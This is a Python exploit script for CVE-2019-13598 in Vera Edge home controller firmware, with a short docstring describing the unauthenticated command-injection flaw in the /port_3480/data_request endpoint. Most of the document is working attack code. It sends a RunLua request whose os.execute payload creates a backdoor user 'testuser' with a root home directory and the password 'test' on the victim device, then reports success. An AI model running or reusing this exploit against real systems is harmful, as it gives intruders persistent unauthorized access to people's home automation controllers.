"""
References:
https://distributedcompute.com/2019/07/13/vera-edge-home-controller-rce-via-unauthenticated-command-injection/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13598

VeraEdge Firmware 1.7.4452 CVE-2019-13598:
    LuaUPnP in Vera Edge Home Controller 1.7.4452 allows remote unauthenticated users to execute 
    arbitrary OS commands via the code parameter to /port_3480/data_request because the 
    "No unsafe lua allowed" code block is skipped. Exploiting LuaUPnP via command injection will
    likely grant the same root level privileges.
    Lua scripts submitted in the Test Luup code (Lua) form in the web interface are handled by 
    the /port_3480/data_request endpoint which forwards requests to a C++ program called LuaUPnP.
    LuaUPnP does not whitelist input allowing for the use of insecure API calls.
    Furthermore, the endpoint does not have any authentication or authorization requirements.
    Converted Curl exploit to request in python.

RCE Command Injection:
path = http://192.168.86.30/port_3480/data_request
"""

import logging
import os, sys, subprocess
import re
import requests

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green

def VeraEdge_CVE_2019_13598(victim_ip):
    try:
        # perform RCE and check if payload sent successfully
        exploit_result = os_command_injection(victim_ip)
        if exploit_result:
            # print('CVE-2019-13598 exploit successful! A user (testuser:test) has been added to VeraEdge.')
            return G+'CVE-2019-13598 exploit successful! A user (testuser:test) has been added to VeraEdge.'+W
        else:
            # print('CVE-2019-13598 exploit failed!')
            return R+'CVE-2019-13598 exploit failed!'+W
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()

def os_command_injection(victim_ip):

    # VeraEdge CVE-2019-13598 exploit
    CVE_2019_13598_exploit = 'id=lu_action&serviceId=urn:micasaverde-com:serviceId:HomeAutomationGateway1&action=RunLua&Code=os.execute(%22adduser%20-h%20%2Froot%20-s%20%2Fbin%2Fash%20testuser%22)%3B%0Aos.execute(%22echo%20-e%20%5C%22test%5Cntest%5C%22%20%7C%20passwd%20testuser%22)'
    url = 'http://{}/port_3480/data_request'.format(victim_ip)

    try:
        # send a POST request and detect if payload is sent successfully
        res = requests.post(url=url, data=CVE_2019_13598_exploit, verify=False)
        if res.status_code == 200:
            return True
        else:
            return False
    except:
        e = sys.exc_info()[1]
        print("Error: %s" % e)
        return False